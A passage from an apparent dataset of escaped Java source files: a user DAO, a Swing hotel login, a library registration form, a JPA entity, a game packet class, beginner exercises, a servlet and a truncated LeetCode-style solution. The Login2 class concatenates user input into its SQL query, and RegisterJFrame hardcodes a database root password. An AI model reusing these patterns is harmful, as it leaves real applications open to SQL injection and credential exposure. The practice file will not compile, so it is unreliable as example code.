ArrayList<>();\r\n        String sqlList = \"SELECT * FROM user\";\r\n        try (PreparedStatement preparedStatement = connection.prepareStatement(sqlList)){\r\n\r\n            ResultSet resultSet = preparedStatement.executeQuery(sqlList);\r\n            while (resultSet.next()){\r\n                User user = new User();\r\n                user.setId(resultSet.getLong(\"ID\"));\r\n                user.setName(resultSet.getString(\"NAME\"));\r\n                user.setLastName(resultSet.getString(\"LASTNAME\"));\r\n                user.setAge(resultSet.getByte(\"AGE\"));\r\n                userList.add(user);\r\n                System.out.println(user);\r\n            }\r\n        } catch (SQLException e) {\r\n            e.printStackTrace();\r\n        }\r\n\r\n        return  userList;\r\n    }\r\n\r\n    public void cleanUsersTable() {\r\n        String deleteTableData =\"TRUNCATE TABLE user\";\r\n        try (PreparedStatement preparedStatement = connection.prepareStatement(deleteTableData)){\r\n            preparedStatement.executeUpdate();\r\n        } catch (SQLException e) {\r\n            e.printStackTrace();\r\n        }\r\n\r\n\r\n    }\r\n}\r\n",
    "package Hotel.Management.System;\r\n\r\nimport javax.swing.*;\r\nimport java.awt.*;\r\nimport java.awt.event.ActionEvent;\r\nimport java.awt.event.ActionListener;\r\nimport java.sql.ResultSet;\r\n\r\npublic class Login2 extends JFrame {\r\n    JTextField t1;\r\n    JPasswordField p1;\r\n    JButton b1, b2;\r\n    Login2(){\r\n        JLabel l1 = new JLabel(\"Username\");\r\n        l1.setBounds(40,20,100,30);\r\n        l1.setForeground(Color.white);\r\n        l1.setFont(new Font(\"Tahoma\",Font.BOLD,18));\r\n        add(l1);\r\n        JTextField t1 = new JTextField();\r\n        t1.setBounds(150,20,160,30);\r\n        t1.setFont(new Font(\"Tahoma\",Font.BOLD,20));\r\n        t1.setForeground(Color.white);\r\n        t1.setBackground(new Color(16,108,115));\r\n        add(t1);\r\n\r\n        JLabel l2 =new JLabel(\"Password\");\r\n        l2.setFont(new Font(\"Tahoma\",Font.BOLD,18));\r\n        l2.setForeground(Color.white);\r\n        l2.setBounds(40,80,100,30);\r\n        add(l2);\r\n        JPasswordField p1 = new JPasswordField();\r\n        p1.setForeground(Color.white);\r\n        p1.setFont(new Font(\"Tahoma\" , Font.BOLD,20));\r\n        p1.setBounds(150,80,160,30);\r\n        p1.setBackground(new Color(16,108,115));\r\n        add(p1);\r\n\r\n        JButton b1 = new JButton(\"Login\");\r\n        b1.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        b1.setForeground(Color.white);\r\n        b1.setBackground(Color.black);\r\n        b1.setBounds(40,150,120,30);\r\n        add(b1);\r\n        b1.addActionListener(new ActionListener() {\r\n            @Override\r\n            public void actionPerformed(ActionEvent e) {\r\n                if (e.getSource()==b1){\r\n                    try{\r\n                        Con_database c = new Con_database();\r\n                        String  user = t1.getText();\r\n                        String pass = p1.getText();\r\n\r\n                        String q = \"select * from  login2 where user_name = '\"+user+\"' and password = '\"+pass+\"'\";\r\n                        // ResultSet resultSet= c.statement.executeQuery(q);\r\n                        ResultSet resultSet = c.statement.executeQuery(q);\r\n                        if (resultSet.next()){\r\n                           new Admin();\r\n                            setVisible(false);\r\n                        }\r\n                        else {\r\n                            JOptionPane.showMessageDialog(null,\"invalid \");\r\n                        }\r\n\r\n                    }catch (Exception E){\r\n                        E.printStackTrace();\r\n\r\n\r\n                    }\r\n\r\n                }\r\n\r\n                }\r\n\r\n\r\n        });\r\n        JButton b2 = new JButton(\"Cancel\");\r\n        b2.setFont(new Font(\"Tahoma\",Font.BOLD,17));\r\n        b2.setForeground(Color.white);\r\n        b2.setBackground(Color.black);\r\n        b2.setBounds(190,150,120,30);\r\n        add(b2);\r\n        b2.addActionListener(new ActionListener() {\r\n            @Override\r\n            public void actionPerformed(ActionEvent e) {\r\n                if (e.getSource()==b2){\r\n                    new Dashboard();\r\n                    setVisible(false);\r\n                }\r\n\r\n            }\r\n        });\r\n\r\n        ImageIcon imageIcon= new ImageIcon(ClassLoader.getSystemResource(\"H.M (3).gif\"));\r\n        //if gif image size is not same you can scale them\r\n        //image l1 =imageIcon = new ImageIcon().getScaledInstance(288,300,image.SCALE_DEFAULT);\r\n        JLabel label = new JLabel(imageIcon);\r\n        label.setBounds(315,-30,300,255);\r\n        add(label);\r\n\r\n\r\n\r\n\r\n\r\n        getContentPane().setBackground(new Color(3,45,48));\r\n        setLayout(null);\r\n        setUndecorated(true);\r\n        setVisible(true);\r\n        setSize(600,300);\r\n        setLocation(400,270);\r\n\r\n\r\n\r\n    }\r\n    public static void main(String[] args) {\r\n        new Login2();\r\n\r\n    }\r\n}\r\n",
    "package ui;\nimport cn.hutool.captcha.CaptchaUtil;\nimport cn.hutool.captcha.CircleCaptcha;\nimport java.sql.*;\n\nimport javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.*;\n\n\npublic class RegisterJFrame extends JFrame implements MouseListener\n{\n    Connection connection;\n    Statement statement;\n    String sql;\n    String name;\n    String pwd;\n    String pwd2;\n    String veri;\n    Box row1 = Box.createHorizontalBox();\n    Box row2 = Box.createHorizontalBox();\n    Box row3 = Box.createHorizontalBox();\n    Box row4 = Box.createHorizontalBox();\n    Box row5 = Box.createHorizontalBox();\n    Box col = Box.createVerticalBox();\n\n    JPanel panel1 = new JPanel(new BorderLayout());\n    JPanel panel2 = new JPanel();\n\n    JLabel title = new JLabel(\"\u6b22\u8fce\u4f7f\u7528\u56fe\u4e66\u9986\u7ba1\u7406\u7cfb\u7edf\",JLabel.CENTER);\n    JLabel name_label = new JLabel(\"\u60a8\u7684\u8d26\u53f7:\");\n    JLabel pwd_label = new JLabel(\"\u60a8\u7684\u5bc6\u7801:\");\n    JLabel pwd_label2 = new JLabel(\"\u786e\u8ba4\u5bc6\u7801:\");\n    JLabel veri_label = new JLabel(\"\u9a8c\u8bc1\u7801:\");\n    JTextField name_text = new JTextField(30);\n    JPasswordField pwd_text = new JPasswordField(30);\n    JPasswordField pwd_text2 = new JPasswordField(30);\n    JTextField veri_text = new JTextField(10);\n    JButton return_btn = new JButton(\"\u8fd4\u56de\");\n    JButton register = new JButton(\"\u6ce8\u518c\");\n    Font font = new Font(\"\u5b8b\u4f53\",Font.BOLD,30);\n    CircleCaptcha captcha;\n    Image image;\n    ImageIcon imageIcon;\n    JLabel label;\n    public RegisterJFrame() throws SQLException, ClassNotFoundException\n\n    {\n\n        init();\n        connect();\n        veri_init();\n\n        initComponent();\n        addComponent();\n\n        setReturn_btn();\n\n        setRegister();\n\n\n\n        //\u8bbe\u7f6e\u7a97\u53e3\u7684\u53ef\u89c1\u6027\n        this.setVisible(true);\n    }\n    private void connect() throws SQLException, ClassNotFoundException\n    {\n        Class.forName(\"com.mysql.cj.jdbc.Driver\");\n        String url = \"jdbc:mysql://localhost:3306/library_system?useUnicode=true&characterEncoding=utf8&useSSL=true\";\n        String username = \"root\";\n        String password = \"root230817\";\n        connection = DriverManager.getConnection(url, username, password);\n        statement = connection.createStatement();\n    }\n    private void init()\n    {\n        //\u8bbe\u7f6e\u7a97\u53e3\u7684\u5927\u5c0f\n        this.setSize(900,700);\n        //\u8bbe\u7f6e\u7a97\u53e3\u7684\u6807\u9898\n        this.setTitle(\"\u6ce8\u518c\u754c\u9762\");\n        //\u8bbe\u7f6e\u7a97\u53e3\u7684\u4f4d\u7f6e\u5c45\u4e2d\n        this.setLocationRelativeTo(null);\n\n        this.setLayout(null);\n\n        //\u8bbe\u7f6e\u7a97\u53e3\u7684\u5173\u95ed\u6a21\u5f0f\n        this.setDefaultCloseOperation(this.EXIT_ON_CLOSE);\n    }\n\n    private void veri_update()\n    {\n        // \u5b9a\u4e49\u56fe\u5f62\u9a8c\u8bc1\u7801\u7684\u957f\u3001\u5bbd\u3001\u9a8c\u8bc1\u7801\u5b57\u7b26\u6570\u3001\u5e72\u6270\u5143\u7d20\u4e2a\u6570\n        captcha = CaptchaUtil.createCircleCaptcha(100, 40, 4, 30);\n\n\n        image = captcha.getImage();\n        imageIcon = new ImageIcon(image);\n        if(label == null)\n            label = new JLabel(imageIcon);\n        else\n            label.setIcon(imageIcon);\n    }\n\n    private void veri_init()\n    {\n        veri_update();\n        label.addMouseListener(this);\n    }\n\n    public void mouseClicked(MouseEvent e)\n    {\n        if(e.getSource()==label)\n        {\n            veri_update();\n            label.repaint();\n        }\n    }\n    public void mouseReleased(MouseEvent e){}\n    public void mouseEntered(MouseEvent e){}\n    public void mouseExited(MouseEvent e){}\n    public void mousePressed(MouseEvent e){}\n\n    private void initComponent()\n    {\n\n        name_label.setFont(font);\n        name_text.setFont(font);\n        pwd_label.setFont(font);\n        pwd_text.setFont(font);\n        pwd_label2.setFont(font);\n        pwd_text2.setFont(font);\n        veri_label.setFont(font);\n        veri_text.setFont(font);\n\n    }\n\n\n    private void addComponent()\n    {\n        row1.add(name_label);\n        row1.add(Box.createHorizontalStrut(10));\n        row1.add(name_text);\n\n        row2.add(pwd_label);\n        row2.add(Box.createHorizontalStrut(10));\n        row2.add(pwd_text);\n\n        row3.add(veri_label);\n        row3.add(Box.createHorizontalStrut(40));\n        row3.add(veri_text);\n        row3.add(Box.createHorizontalStrut(10));\n        row3.add(label);\n\n\n        return_btn.setFont(new Font(\"\u5b8b\u4f53\",Font.BOLD,30));\n        row4.add(return_btn);\n\n        row4.add(Box.createHorizontalStrut(300));\n\n        register.setFont(new Font(\"\u5b8b\u4f53\",Font.BOLD,30));\n        row4.add(register,BorderLayout.CENTER);\n\n\n        row5.add(pwd_label2);\n        row5.add(Box.createHorizontalStrut(10));\n        row5.add(pwd_text2);\n\n\n        title.setFont(new Font(\"\u9ed1\u4f53\",Font.BOLD,50));\n\n\n        col.add(row1);\n        col.add(Box.createVerticalStrut(10));\n        col.add(row2);\n        col.add(Box.createVerticalStrut(10));\n\n        col.add(row5);\n        col.add(Box.createVerticalStrut(10));\n        col.add(row3);\n\n        col.add(Box.createVerticalStrut(30));\n        col.add(row4);\n\n        panel1.setBounds(0,0,900,300);\n        panel1.add(title,BorderLayout.CENTER);\n        this.add(panel1);\n\n        panel2.setBounds(0,300,900,400);\n        panel2.add(col);\n        this.add(panel2);\n    }\n    private void setReturn_btn()\n    {\n        return_btn.addActionListener(new ActionListener(){",
    "package com.ufrn.imd.ecommerce.models;\n\nimport jakarta.persistence.*;\n\nimport java.math.BigDecimal;\nimport java.util.List;\nimport java.util.Objects;\nimport java.util.Set;\n\n@Entity\npublic class Produto {\n\n    @Id\n    @GeneratedValue(strategy = GenerationType.AUTO)\n    private Long id;\n\n    @Column(columnDefinition = \"VARCHAR(50)\")\n    private String nome;\n\n    @Column(columnDefinition = \"TEXT\")\n    private String descricao;\n\n    @Column(scale = 2)\n    private BigDecimal valorTotal;\n\n    @Column(columnDefinition = \"VARCHAR(50)\")\n    private String marca;\n\n    @Column(columnDefinition = \"TEXT\")\n    private String observacao;\n\n    @ManyToOne\n    @JoinColumn(name = \"anunciante_id\")\n    private Anunciante anunciante;\n\n    @OneToOne(cascade = CascadeType.ALL, optional = true)\n    @JoinColumn(name = \"anuncio_id\", referencedColumnName = \"id\")\n    private Anuncio anuncio;\n\n\n    @OneToMany(mappedBy = \"produto\", cascade = CascadeType.ALL, fetch = FetchType.LAZY)\n    private List<Imagem> imagems;\n    @OneToMany(mappedBy = \"produto\", cascade = CascadeType.ALL, fetch = FetchType.LAZY)\n    private List<Categoria> categorias;\n    @OneToMany(mappedBy = \"produto\", cascade = CascadeType.ALL, fetch = FetchType.LAZY)\n    private  List<Estoque> estoques;\n\n    @OneToMany(mappedBy = \"produto\")\n    private Set<PedidoItem> pedidoItems;\n\n    public Produto() {\n    }\n\n\n    public Produto(String nome, String descricao, BigDecimal valorTotal, String marca, String observacao, Anunciante anunciante, Anuncio anuncio, List<Imagem> imagems, List<Categoria> categorias, List<Estoque> estoques, Set<PedidoItem> pedidoItems) {\n        this.nome = nome;\n        this.descricao = descricao;\n        this.valorTotal = valorTotal;\n        this.marca = marca;\n        this.observacao = observacao;\n        this.anunciante = anunciante;\n        this.anuncio = anuncio;\n        this.imagems = imagems;\n        this.categorias = categorias;\n        this.estoques = estoques;\n        this.pedidoItems = pedidoItems;\n    }\n\n    public Long getId() {\n        return id;\n    }\n\n    public void setId(Long id) {\n        this.id = id;\n    }\n\n    public String getNome() {\n        return nome;\n    }\n\n    public void setNome(String nome) {\n        this.nome = nome;\n    }\n\n    public String getDescricao() {\n        return descricao;\n    }\n\n    public void setDescricao(String descricao) {\n        this.descricao = descricao;\n    }\n\n    public BigDecimal getValorTotal() {\n        return valorTotal;\n    }\n\n    public void setValorTotal(BigDecimal valorTotal) {\n        this.valorTotal = valorTotal;\n    }\n\n    public String getMarca() {\n        return marca;\n    }\n\n    public void setMarca(String marca) {\n        this.marca = marca;\n    }\n\n    public String getObservacao() {\n        return observacao;\n    }\n\n    public void setObservacao(String observacao) {\n        this.observacao = observacao;\n    }\n\n    public Anunciante getAnunciante() {\n        return anunciante;\n    }\n\n    public void setAnunciante(Anunciante anunciante) {\n        this.anunciante = anunciante;\n    }\n\n    public Anuncio getAnuncio() {\n        return anuncio;\n    }\n\n    public void setAnuncio(Anuncio anuncio) {\n        this.anuncio = anuncio;\n    }\n\n    public List<Imagem> getImagems() {\n        return imagems;\n    }\n\n    public void setImagems(List<Imagem> imagems) {\n        this.imagems = imagems;\n    }\n\n    public List<Categoria> getCategorias() {\n        return categorias;\n    }\n\n    public void setCategorias(List<Categoria> categorias) {\n        this.categorias = categorias;\n    }\n\n    public List<Estoque> getEstoques() {\n        return estoques;\n    }\n\n    public void setEstoques(List<Estoque> estoques) {\n        this.estoques = estoques;\n    }\n\n    public Set<PedidoItem> getPedidoItems() {\n        return pedidoItems;\n    }\n\n    public void setPedidoItems(Set<PedidoItem> pedidoItems) {\n        this.pedidoItems = pedidoItems;\n    }\n\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        Produto produto = (Produto) o;\n        return Objects.equals(id, produto.id) && Objects.equals(nome, produto.nome) && Objects.equals(descricao, produto.descricao) && Objects.equals(valorTotal, produto.valorTotal) && Objects.equals(marca, produto.marca) && Objects.equals(observacao, produto.observacao) && Objects.equals(anunciante, produto.anunciante) && Objects.equals(anuncio, produto.anuncio) && Objects.equals(imagems, produto.imagems) && Objects.equals(categorias, produto.categorias) && Objects.equals(estoques, produto.estoques) && Objects.equals(pedidoItems, produto.pedidoItems);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(id, nome, descricao, valorTotal, marca, observacao, anunciante, anuncio, imagems, categorias, estoques, pedidoItems);\n    }\n}\n",
    "package Juego.Packet;\n\nimport Server.UDP.Cliente;\nimport Server.UDP.Servidor;\n\n/**\n * La clase Packet representa un paquete de datos que puede ser enviado desde un cliente al servidor o desde el servidor a todos los clientes conectados en el juego Bomberman.\n */\npublic class Packet {\n    \n    /**\n     * Enumeraci\u00f3n que define los tipos de paquete disponibles con sus respectivos IDs.\n     */\n    public static enum packet{\n        INVALIDO(-1), INGRESO(00), DESCONEXION(01), DERROTA(02), \n        INFORMACION(03), ACTUALIZACION(04), GAMEOVER(05);\n        \n        private int id;\n\n        /**\n         * Crea una instancia de packet con el ID especificado.\n         * \n         * @param id El ID del paquete.\n         */\n        private packet(int id) {\n            this.id = id;\n        }\n\n        /**\n         * Obtiene el ID del paquete.\n         * \n         * @return El ID del paquete.\n         */\n        public int getId() {\n            return this.id;\n        }\n    }\n\n    protected byte id; // ID del paquete\n    protected String nombre; // Nombre asociado al paquete\n\n    /**\n     * Crea una instancia de Packet con el ID especificado.\n     * \n     * @param id El ID del paquete.\n     */\n    public Packet(int id){\n        this.id = (byte) id;\n        this.nombre = \"\";\n    }\n\n    /**\n     * Env\u00eda el paquete desde un cliente al servidor.\n     * \n     * @param cliente El cliente que enviar\u00e1 el paquete.\n     */\n    public void enviar(Cliente cliente){\n        cliente.enviarServidor(getDatos());\n    } \n\n    /**\n     * Env\u00eda el paquete desde el servidor a todos los clientes conectados.\n     * \n     * @param servidor El servidor que enviar\u00e1 el paquete.\n     */\n    public void enviar(Servidor servidor){\n        servidor.enviarTodosLosClientes(getDatos());\n    }\n\n    /**\n     * Obtiene los datos del paquete en formato de bytes.\n     * \n     * @return Los datos del paquete en formato de bytes.\n     */\n    public byte[] getDatos() {\n        String datos = String.format(\"%02d%s\", id, getNombre()); // Formato: ID + Nombre\n        return datos.getBytes();\n    }\n\n    /**\n     * Obtiene el ID del paquete.\n     * \n     * @return El ID del paquete.\n     */\n    public byte getId() {\n        return id;\n    }\n\n    /**\n     * Establece el ID del paquete.\n     * \n     * @param id El ID del paquete.\n     */\n    public void setId(byte id) {\n        this.id = id;\n    }\n\n    /**\n     * Obtiene el nombre asociado al paquete.\n     * \n     * @return El nombre asociado al paquete.\n     */\n    public String getNombre() {\n        return this.nombre;\n    }\n\n    /**\n     * Establece el nombre asociado al paquete.\n     * \n     * @param nombre El nombre asociado al paquete.\n     */\n    public void setNombre(String nombre) {\n        this.nombre = nombre;\n    }\n\n    /**\n     * Lee la informaci\u00f3n del paquete a partir de los datos recibidos.\n     * \n     * @param datos Los datos del paquete.\n     * @return La informaci\u00f3n del paquete.\n     */\n    public String leerInformacion(byte[] datos){\n        String mensaje = new String(datos).trim();\n        return mensaje.substring(3); // Elimina los primeros 3 caracteres del mensaje, que representan el ID\n    }\n\n    /**\n     * Identifica el tipo de paquete a partir del ID especificado.\n     * \n     * @param id El ID del paquete.\n     * @return El tipo de paquete identificado.\n     */\n    public static packet identificarTipo(int id){\n        for(packet packet: packet.values()){\n            if(packet.getId() == id)\n                return packet;\n        }\n        return packet.INVALIDO; // Retorna el tipo de paquete como INV\u00c1LIDO si no se encuentra ning\u00fan tipo correspondiente al ID especificado\n    }\n}\n",
    "package BasicJava;\r\n\r\nimport java.util.Scanner;\r\n\r\npublic class HelloWorld {\r\n\r\n\tpublic static void main(String[] args) {\r\n\t\t//for loop \r\n\t\tint n=5;\r\n\t\tfor(int i=1;i<=n;i++) {\r\n\t\t\tSystem.out.print(i);\r\n\t\t}\r\n\t\r\n\t\tfor(int i=1;i<=n;i++) {\r\n\t\t\tfor(int j=1;j<=n;j++) {\r\n\t\t\t\tSystem.out.print(\"*\");\r\n\t\t\t}\r\n\t\t\tSystem.out.println();\r\n\t\t}\r\n\t\tint i=1;\r\n\t\twhile(i<=n) {\r\n\t\t\tint j=1;\r\n\t\t\twhile(j<=n) {\r\n\t\t\t\tSystem.out.print(\"*\");\r\n\t\t\t\tj++;\r\n\t\t\t}\r\n\t\t\tSystem.out.println();\r\n\t\t\ti++;\r\n\t\t}\r\n\t\t\r\n\t\t\r\n\t\t// Examples of inc and dec\r\n\t\tint a=5;\r\n\t\tint b=7;\r\n\t\tif(a++>=5 && b--<7) {\r\n\t\t\tSystem.out.print(\"inside if\");\r\n\t\t}\r\n\t\tSystem.out.println(a);\r\n\t\tSystem.out.println(b);\r\n\t\t\r\n\t\t\r\n\t\tif(a++>5 || b--<7) {\r\n\t\t\tSystem.out.print(\"inside if\");\r\n\t\t}\r\n\t\tSystem.out.println(a);\r\n\t\tSystem.out.println(b);\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t//Increment/Decrement operators\r\n\t\tint i=5;\r\n\t\tint a=++i;\r\n\t\tint b=(i--)+(++i);\r\n\t\tint c=(++a)+(b--)+(--i);\r\n\t\tSystem.out.println(i);\r\n\t\tSystem.out.println(a);\r\n\t\tSystem.out.println(b);\r\n\t\tSystem.out.println(c);\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t//Scope\r\n\t\tint n=5;\r\n\t\tint i=1;\r\n\t\twhile(i<=n) {\r\n\t\t\tint j=2;\r\n\t\t\tSystem.out.print(j);\r\n\t\t\tj=j+1;\r\n\t\t\ti=i+1;\r\n\t\t}\r\n\t\tif(i==5) {\r\n\t\t\tint x=2;\r\n\t\t}\r\n\t\tSystem.out.print(x);\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t//Inverted Triangle\r\n\t\tScanner s =new Scanner(System.in);\r\n\t\tint n=s.nextInt();\r\n\t\tint i=1;\r\n\t\twhile(i<=n) {\r\n\t\t\tint j=1;\r\n\t\t\twhile(j<=i-1) {\r\n\t\t\t\tSystem.out.print(\" \");\r\n\t\t\t\tj=j+1;\r\n\t\t\t}\r\n\t\t\tint k=1;\r\n\t\t\twhile(k<=n-i+1) {\r\n\t\t\t\tSystem.out.print(\"*\");\r\n\t\t\t\tk=k+1;\r\n\t\t\t}\r\n\t\t\tSystem.out.println();\r\n\t\t\ti=i+1;\r\n\t\t}\r\n\t\t\r\n\t\t//Full Diamond\r\n\t\tScanner s =new Scanner(System.in);\r\n\t\tint n=s.nextInt();\r\n\t\tint i=1;\r\n\t\twhile(i<=n) {\r\n\t\t\tint j=1;\r\n\t\t\twhile(j<=n-i) {\r\n\t\t\t\tSystem.out.print(\" \");\r\n\t\t\t\tj=j+1;\r\n\t\t\t}\r\n\t\t\tint k=1;\r\n\t\t\twhile(k<=2*i-1) {\r\n\t\t\t\tSystem.out.print(\"*\");\r\n\t\t\t\tk=k+1;\r\n\t\t\t}\r\n\t\t\tSystem.out.println();\r\n\t\t\ti=i+1;\r\n\t\t}\r\n\t\ti=1;\r\n\t\twhile(i<=n-1) {\r\n\t\t\tint j=1;\r\n\t\t\twhile(j<=i) {\r\n\t\t\t\tSystem.out.print(\" \");\r\n\t\t\t\tj=j+1;\r\n\t\t\t}\r\n\t\t\tint k=1;\r\n\t\t\twhile(k<=2*(n-i)-1) {\r\n\t\t\t\tSystem.out.print(\"*\");\r\n\t\t\t\tk=k+1;\r\n\t\t\t}\r\n\t\t\tSystem.out.println();\r\n\t\t\ti=i+1;\r\n\t\t}\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n//\t\tHalf Diamond\r\n\t\tScanner s =new Scanner(System.in);\r\n\t\tint n=s.nextInt();\r\n\t\tint i=1;\r\n\t\twhile(i<=n) {\r\n\t\t\tint j=1;\r\n\t\t\twhile(j<=n-i) {\r\n\t\t\t\tSystem.out.print(\" \");\r\n\t\t\t\tj=j+1;\r\n\t\t\t}\r\n\t\t\tint k=1;\r\n\t\t\twhile(k<=2*i-1) {\r\n\t\t\t\tSystem.out.print(\"*\");\r\n\t\t\t\tk=k+1;\r\n\t\t\t}\r\n\t\t\tSystem.out.println();\r\n\t\t\ti=i+1;\r\n\t\t}\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n//Pattern -- ABC\r\n//\t\t     ABC\r\n//\t\t     ABC\r\n\t\twhile(i<=n) {\r\n\t\t\tint j=1;\r\n\t\t\twhile(j<=i) {\r\n\t\t\t\tSystem.out.print((char)('A'+j-1));\r\n\t\t\t\tj=j+1;\r\n\t\t\t}\r\n\t\t\tSystem.out.println();\r\n\t\t\ti=i+1;\r\n\t\t}\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t//Table\r\n\t\tint n=s.nextInt();\r\n\t\tint i=1;\r\n\t\twhile(i<=10) {\r\n\t\t\tSystem.out.println(n + \" * \"+ i + \" = \" + n*i);\r\n\t\t\ti=i+1;\r\n\t\t}\r\n\t\t\r\n\t\t//Factors of a number\r\n\t\tint n=s.nextInt();\r\n\t\tint i=2;\r\n\t\twhile(i<=n-1) {\r\n\t\t\tif(n%i==0) {\r\n\t\t\t\tSystem.out.println(i);\r\n\t\t\t}\r\n\t\t\ti=i+1;\r\n\t\t}\r\n\t\t\r\n\t\t\r\n\t\t//sum of digits\r\n\t\tint n=s.nextInt();\r\n\t\tint sum=0;\r\n\t\twhile(n>0) {\r\n\t\t\tint mod= n%10;\r\n\t\t\tsum=sum+mod;\r\n\t\t\tn=n/10;\r\n\t\t}\r\n\t\tSystem.out.print(sum);\r\n\t\t\r\n\t\t\r\n\t\t//Power of a number\r\n\t\tint x=s.nextInt();\r\n\t\tint n=s.nextInt();\r\n\t\tint ans=1;\r\n\t\tint i=1;\r\n\t\twhile(i<=n) {\r\n\t\t\tans=ans*x;\r\n\t\t\ti=i+1;\r\n\t\t}\r\n\t\tSystem.out.print(ans);\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n//Pattern --   *\r\n//\t\t      **\r\n//\t\t     *** \r\n\t\tScanner s=new Scanner(System.in);\r\n\t\tint n=s.nextInt();\r\n\t\tint i=1;\r\n\t\twhile(i<=n) {\r\n\t\t\tint j=1;\r\n\t\t\twhile(j<=n-i) {\r\n\t\t\t\tSystem.out.print(\" \");\r\n\t\t\t\tj=j+1;\r\n\t\t\t}\r\n\t\t\twhile(j<=n) {\r\n\t\t\t\tSystem.out.print(\"*\");\r\n\t\t\t\tj=j+1;\r\n\t\t\t}\r\n\t\t\tSystem.out.println();\r\n\t\t\ti=i+1;\r\n\t\t}\r\n\t\t\r\n\t\t\r\n\t//Prime number\t\r\n\t\tint count=2;\r\n\t\tboolean isPrime =true; \r\n\t\twhile(count<=n-1) {\r\n\t\t\tif(n%count==0) {\r\n\t\t\t\tisPrime=false;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\tcount=count+1;\r\n\t\t}\r\n\t\tif(isPrime==true) {\r\n\t\t\tSystem.out.print( n + \" is a prime number\");\r\n\t\t}else {\r\n\t\t\tSystem.out.print( n + \" is not prime number\");\r\n\t\t}\r\n\t\t\r\n\t\t\r\n\t\t//Sum of n numbers\r\n\t\tint count =1;\r\n\t\tint sum=0;\r\n\t\twhile(count<=n) {\r\n\t\t\tif(count%2==0) {\r\n\t\t\t\tsum= sum+count;\r\n\t\t\t}\r\n\t\t\tcount=count+1;\r\n\t\t}\r\n\t\tSystem.out.print(sum);\r\n\t\t\r\n\t\t//greatest of 3 numbers\r\n\t\tint a =s.nextInt();\r\n\t\tint b =s.nextInt();\r\n\t\tint c =s.nextInt();\r\n\t\tif(a>=b && a>=c) {\r\n\t\t\tSystem.out.print( a +\" is the greatest\");\r\n\t\t}else if(b>=a && b>=c) {\r\n\t\t\tSystem.out.print(b+ \" is the greatest\");\r\n\t\t}else {\r\n\t\t\tSystem.out.print(c+ \" is the greatest\");\r\n\t\t}\r\n\t\t\r\n\t\t// logical and relational operators\r\n\t\tboolean ans= a!=b;\r\n\t\tSystem.out.print(a>b && b!=5);\r\n\t\tSystem.out.print(a<b && a!=5);\r\n\t\tSystem.out.print(a>b || b!=5);\r\n\t\tSystem.out.print(a<b || a!=5);\r\n\t\tSystem.out.print(a>b ^ b!=5);\r\n\t\tSystem.out.print(a<b ^ a!=5);\r\n\t\tSystem.out.print(!ans);\r\n\r\n\t}\r\n\t\r\n\r\n}\r\n",
    "\r\n\r\nimport java.io.IOException;\r\nimport java.io.PrintWriter;\r\n\r\nimport javax.servlet.RequestDispatcher;\r\nimport javax.servlet.ServletException;\r\nimport javax.servlet.annotation.WebServlet;\r\nimport javax.servlet.http.HttpServlet;\r\nimport javax.servlet.http.HttpServletRequest;\r\nimport javax.servlet.http.HttpServletResponse;\r\nimport javax.servlet.http.HttpSession;\r\n\r\n/**\r\n * Servlet implementation class ValidationServlet\r\n */\r\n@WebServlet(\"/ValidationServlet\")\r\npublic class ValidationServlet extends HttpServlet {\r\n\tprivate static final long serialVersionUID = 1L;\r\n       \r\n    /**\r\n     * @see HttpServlet#HttpServlet()\r\n     */\r\n    public ValidationServlet() {\r\n        super();\r\n        // TODO Auto-generated constructor stub\r\n    }\r\n\r\n\t/**\r\n\t * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)\r\n\t */\r\n\tprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r\n\t\tresponse.setContentType(\"text/html\");\r\n\t\tPrintWriter pw=response.getWriter();\r\n\t\t\r\n\t\tint n1=Integer.parseInt(request.getParameter(\"t1\"));\r\n\t\tif(n1>0 && n1<=10)\r\n\t\t{\r\n\t\t\tHttpSession session=request.getSession(true);\r\n\t\t\tsession.setAttribute(\"n1\", n1);\r\n\t\t\tRequestDispatcher rd=request.getRequestDispatcher(\"multiply\");\r\n\t\t\trd.forward(request, response);\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tpw.println(\"Please enter number between 1 and 10 only\");\r\n\t\t\tRequestDispatcher rd=request.getRequestDispatcher(\"/tabledata.html\");\r\n\t\t\trd.include(request, response);\r\n\t\t}\r\n\t}\r\n\r\n\t/**\r\n\t * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)\r\n\t */\r\n\tprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r\n\t\t// TODO Auto-generated method stub\r\n\t\tdoGet(request, response);\r\n\t}\r\n\r\n}\r\n",
    "package Day_6.Bhavuk;\n\nimport org.w3c.dom.ls.LSOutput;\n\nimport java.util.*;\n\npublic class KFrequentElements {\n    public static void main(String[] args) {\n        int[] nums = {1, 1, 1, 2, 2, 3};\n        int[] ans = new Solution().topKFrequent(nums,2);\n        System.out.println(Arrays.toString(ans));\n    }\n}\nclass Solution {\n    public int[] topKFrequent(int[] nums, int k) {\n\n        List<Integer>[] bucket = new List[nums.length + 1];\n        Map<Integer, Integer> frequencyMap = new HashMap<>();\n\n        for (int n : nums) {\n            frequencyMap.put(n, frequencyMap.getOrDefault(n, 0) + 1);\n        }\n\n        for (int key : frequencyMap.keySet()) {\n            int frequency = frequencyMap.get(key);\n            if (bucket[frequency] == null) {\n                bucket[frequency] = new ArrayList<>();\n            }\n            bucket[frequency].add(key);\n        }\n\n        List<Integer> topK = new ArrayList<>();\n        for (int pos = bucket.length - 1;pos >= 0 && 